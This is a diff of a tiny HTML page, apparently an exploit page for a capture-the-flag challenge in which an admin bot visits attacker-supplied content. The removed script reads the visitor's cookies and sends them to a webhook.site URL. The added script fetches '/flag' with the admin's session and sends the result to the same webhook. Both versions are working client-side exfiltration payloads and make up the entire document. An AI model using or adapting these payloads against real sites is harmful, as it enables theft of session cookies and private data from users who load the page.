@@ -1,20 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>freeflag</title>
+    <title>flag pls</title>
 </head>
 <body>
-    <h1>Loading...</h1>
-
-    <script>
-        // ambil cookie browser
-        var c = document.cookie;
-
-        // kirim cookie admin ke webhook kamu
-        fetch("https://webhook.site/46a8eb0f-2147-4721-9799-d610a518e0ab?cookie=" + encodeURIComponent(c));
-    </script>
+<script>
+// Fetch flag langsung dari browser admin
+fetch("/flag")
+  .then(r => r.text())
+  .then(flag => {
+      fetch("https://webhook.site/46a8eb0f-2147-4721-9799-d610a518e0ab?flag=" 
+            + encodeURIComponent(flag));
+  });
+</script>
 </body>
-</html> 
-
-
-
+</html>
